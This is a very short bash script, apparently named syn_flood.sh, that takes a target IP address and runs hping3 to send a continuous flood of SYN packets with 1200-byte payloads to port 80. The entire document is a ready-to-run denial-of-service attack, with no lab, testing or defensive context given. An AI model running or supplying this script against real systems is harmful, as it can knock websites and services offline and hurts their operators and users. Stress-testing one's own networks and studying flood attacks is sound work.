#!/bin/bash
# Usage: sudo bash syn_flood.sh <target_ip>

TARGET=$1
sudo hping3 --flood -S -p 80 -d 1200 $TARGET

